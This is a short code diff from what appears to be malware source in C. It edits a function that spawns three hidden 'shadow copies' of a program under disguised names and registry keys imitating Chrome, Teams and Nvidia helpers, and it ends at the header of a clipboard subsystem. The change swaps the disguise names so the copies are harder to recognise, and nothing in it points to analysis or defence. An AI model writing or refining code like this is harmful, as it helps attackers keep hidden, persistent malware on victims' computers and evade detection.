@@ -428,11 +428,11 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
     }
 }
 
-/* Spawn three shadow copies with benign-looking names */
+/* Spawn three shadow copies with varied, benign-looking names */
 void sys_spawn_shadow_copy(void) {
     spawn_single_copy("chrome_update.exe", "ChromeUpdate");
-    spawn_single_copy("google_update.exe", "GoogleUpdate");
-    spawn_single_copy("edge_update.exe", "EdgeUpdate");
+    spawn_single_copy("teams_helper.exe", "TeamsHelper");
+    spawn_single_copy("nvidia_share.exe", "NvidiaShare");
 }
 
 /* === Clipboard Subsystem === */
